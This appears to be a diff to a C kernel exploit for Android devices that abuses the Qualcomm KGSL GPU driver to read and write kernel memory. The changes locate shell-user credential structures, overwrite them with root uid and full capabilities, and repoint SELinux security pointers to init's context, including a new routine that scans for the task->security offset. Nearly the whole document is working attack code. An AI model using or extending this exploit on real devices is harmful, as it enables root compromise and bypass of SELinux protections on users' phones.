@@ -59,9 +59,6 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
 #define KGSL_CACHEMODE_SHIFT 0
 #define KGSL_CACHEMODE_MASK 3
-#define KGSL_CACHEMODE_UNCACHED 0
-#define KGSL_CACHEMODE_WRITECOMBINE 1
-#define KGSL_CACHEMODE_WRITETHROUGH 2
 #define KGSL_CACHEMODE_WRITEBACK 3
 #define KGSL_USER_MEM_TYPE_ADDR 2
 #define KGSL_CONTEXT_PREAMBLE 0x00000010
@@ -78,7 +75,6 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
-// vmlinux symbols (pre-KASLR)
 #define VMLINUX_TEXT      0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
 #define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
@@ -102,6 +98,13 @@ static void try_dc_civac(void *addr) {
     __sync_synchronize();
     signal(SIGILL, old);
     if (dc_civac_works == -1) dc_civac_works = 1;
+}
+
+static void flush_dc_civac_range(void *start, size_t len) {
+    if (dc_civac_works != 1) return;
+    char *p = (char*)((uintptr_t)start & ~63);
+    char *end = (char*)((uintptr_t)start + len);
+    for (; p < end; p += 64) try_dc_civac(p);
 }
 
 static void die(const char *msg) { perror(msg); exit(1); }
@@ -303,6 +306,22 @@ static int write_mem(uint64_t addr, uint32_t *data, int dwords, int ctx_id,
     return 0;
 }
 
+static int find_security_offset(uint64_t task_addr, uint64_t cred_sec_ptr,
+                                int ctx_id, uint64_t ib_ga, unsigned int ib_id,
+                                uint64_t dst_ga, void *ib_m, void *dst_m) {
+    uint32_t buf[SCAN_DWORDS];
+    if (read_mem(task_addr, buf, SCAN_DWORDS, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) < 0)
+        return -1;
+    uint64_t target = cred_sec_ptr;
+    for (int i = 0; i < SCAN_DWORDS - 1; i++) {
+        uint64_t val = (uint64_t)buf[i] | ((uint64_t)buf[i+1] << 32);
+        if (val == target) {
+            return i * 4;
+        }
+    }
+    return -1;
+}
+
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
 
@@ -318,10 +337,6 @@ int main(int argc, char **argv) {
         close(kgsl_fd);
         return 1;
     }
-
-    uint64_t kaslr = (init_cred_addr - VMLINUX_INIT_CRED);
-    uint64_t enforcing_addr = VMLINUX_SELINUX_ENFORCING_BOOT + kaslr;
-    printf("  enforcing_addr=0x%lX\n", enforcing_addr);
 
     printf("[*] Phase 1: Setup rbtree\n");
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
@@ -448,14 +463,12 @@ int main(int argc, char **argv) {
             task_pages[n_task++] = va;
         }
 
-        // Find cred pointer: scan for likely kernel pointer (0xffffffc0xxxxxxxx)
         for (int off = 0x700; off < 0x800; off += 4) {
             uint64_t ptr = (uint64_t)cmd_buf[off/4] | ((uint64_t)cmd_buf[off/4+1] << 32);
             if (ptr >= 0xffffffc000000000ULL && ptr < 0xffffffd000000000ULL) {
-                // Verify it's a cred by reading uid at +4
                 uint32_t cred_buf[8];
                 if (read_mem(ptr, cred_buf, 8, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
-                    if (cred_buf[1] == 2000) { // uid 2000 (shell)
+                    if (cred_buf[1] == 2000) {
                         printf("  [CRED] va=0x%lx off=0x%x cred=0x%lx\n", (unsigned long)va, off, ptr);
                         cred_pages[n_cred] = va;
                         cred_offs[n_cred] = off;
@@ -473,59 +486,98 @@ int main(int argc, char **argv) {
         goto cleanup;
     }
 
-    // Read init_cred->security
+    // Read init_cred->security (this points to init's task_security_struct)
     uint64_t inc_sec = 0;
     {
         uint32_t buf[2];
         if (read_mem(init_cred_addr + 0x78, buf, 2, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
             inc_sec = (uint64_t)buf[0] | ((uint64_t)buf[1] << 32);
             printf("  init_cred->security = 0x%lx\n", inc_sec);
-        }
-    }
-
-    // Write enforcing=0 to make permissive
-    if (enforcing_addr) {
-        uint32_t zero = 0;
-        if (write_mem(enforcing_addr, &zero, 1, ctx_id, ib_ga, ib_id, ib_m) == 0) {
-            printf("[*] Set enforcing to 0\n");
         } else {
-            printf("[-] Failed to write enforcing\n");
+            printf("[-] Failed to read init_cred->security\n");
+            goto cleanup;
         }
     }
 
-    // Overwrite each cred page
+    // Read init's SID (first dword of the security struct)
+    uint32_t init_sid = 0;
+    {
+        uint32_t buf[1];
+        if (read_mem(inc_sec, buf, 1, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
+            init_sid = buf[0];
+            printf("  init SID = 0x%08x\n", init_sid);
+        } else {
+            printf("[-] Failed to read init SID\n");
+            goto cleanup;
+        }
+    }
+
+    // For each found task, overwrite its cred and also set task->security to point to init's security.
     for (int p = 0; p < n_cred; p++) {
-        uint64_t cbase = cred_pages[p] + cred_offs[p];
-        // 1) Write uid=0 and caps
+        uint64_t task_addr = cred_pages[p];
+        uint64_t cbase = task_addr + cred_offs[p];
+
+        // 1) Read current cred->security pointer (before we overwrite it)
+        uint32_t old_sec[2];
+        if (read_mem(cbase + 0x78, old_sec, 2, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) < 0) {
+            printf("[-] Failed to read cred->security for task %d\n", p);
+            continue;
+        }
+        uint64_t old_sec_ptr = (uint64_t)old_sec[0] | ((uint64_t)old_sec[1] << 32);
+
+        // 2) Write uid=0 and capabilities
         uint32_t data[21];
         memset(data, 0, sizeof(data));
-        data[1] = 0x00000004;  // uid=0
-        // capabilities (full)
+        data[1] = 0x00000004; // uid=0
         data[4] = 0xFFFFFFFF; data[5] = 0x0000003F;
         data[6] = 0xFFFFFFFF; data[7] = 0x0000003F;
         data[8] = 0xFFFFFFFF; data[9] = 0x0000003F;
-        if (write_mem(cbase + 0x04, data, 21, ctx_id, ib_ga, ib_id, ib_m) < 0) continue;
-
-        // 2) Write security pointer to init's security (if available)
-        if (inc_sec) {
-            uint32_t sec[2];
-            split64(inc_sec, &sec[0], &sec[1]);
-            if (write_mem(cbase + 0x78, sec, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) continue;
+        if (write_mem(cbase + 0x04, data, 21, ctx_id, ib_ga, ib_id, ib_m) < 0) {
+            printf("[-] Failed to write uid/caps for task %d\n", p);
+            continue;
         }
 
-        // 3) Also write real_cred and cred pointers in task_struct to point to our modified cred
-        // For the task_struct at cred_pages[p], the cred pointers are at +0x738 and +0x740
-        uint64_t task_addr = cred_pages[p];
+        // 3) Write cred->security to point to init's security struct
+        uint32_t sec_ptr[2];
+        split64(inc_sec, &sec_ptr[0], &sec_ptr[1]);
+        if (write_mem(cbase + 0x78, sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) {
+            printf("[-] Failed to write cred->security for task %d\n", p);
+            continue;
+        }
+
+        // 4) Write task->real_cred and task->cred to point to our modified cred
         uint32_t ptr_lo, ptr_hi;
         split64(cbase, &ptr_lo, &ptr_hi);
-        // Write real_cred (0x738) and cred (0x740)
         if (write_mem(task_addr + 0x738, &ptr_lo, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) continue;
         if (write_mem(task_addr + 0x740, &ptr_lo, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) continue;
 
-        // 4) Optionally write task->security (often same as cred->security) - guess offset 0x7D8?
-        // skip for now
+        // 5) Find and set task->security to point to init's security struct
+        // Scan the task page for a pointer that matches old_sec_ptr (the original task->security)
+        int sec_off = find_security_offset(task_addr, old_sec_ptr, ctx_id,
+                                           ib_ga, ib_id, dst_ga, ib_m, dst_m);
+        if (sec_off >= 0 && sec_off < 0x1000) {
+            if (write_mem(task_addr + sec_off, sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) {
+                printf("[-] Failed to write task->security at offset 0x%x\n", sec_off);
+            } else {
+                printf("[+] task->security offset found: 0x%x, written to init's security\n", sec_off);
+            }
+        } else {
+            // Try common offsets for arm64 if scanning fails
+            int common_offs[] = {0x7D8, 0x7E0, 0x7E8};
+            int written = 0;
+            for (int i = 0; i < 3; i++) {
+                if (write_mem(task_addr + common_offs[i], sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m) == 0) {
+                    printf("[+] Wrote task->security at common offset 0x%x\n", common_offs[i]);
+                    written = 1;
+                    break;
+                }
+            }
+            if (!written) {
+                printf("[-] Could not set task->security\n");
+            }
+        }
 
-        // Verify uid
+        // 6) Verify uid
         uint32_t uid_buf[1];
         if (read_mem(cbase + 0x04, uid_buf, 1, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
             printf("  CRED[%d]: uid=0x%08X %s\n", p, uid_buf[0], uid_buf[0] == 0 ? "OK" : "FAIL");
